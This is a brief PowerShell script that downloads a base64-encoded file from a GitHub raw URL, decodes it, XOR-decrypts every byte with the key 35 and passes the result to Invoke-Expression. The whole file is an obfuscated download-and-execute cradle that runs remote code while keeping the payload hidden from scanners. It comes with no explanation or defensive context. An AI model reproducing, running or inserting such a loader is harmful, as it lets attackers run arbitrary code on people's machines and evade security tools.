
$f = Invoke-WebRequest -Uri https://raw.githubusercontent.com/mrzemienie/tools/master/invoke.b64 -UseBasicParsing
$file_b64 =  [Convert]::FromBase64String($f)

for ($i = 0; $i -lt $file_b64.length; $i++) {
    $file_b64[$i] = $file_b64[$i] -bxor 35
    }
 $out = [System.Text.Encoding]::ASCII.GetString($file_b64);

 iex $out;
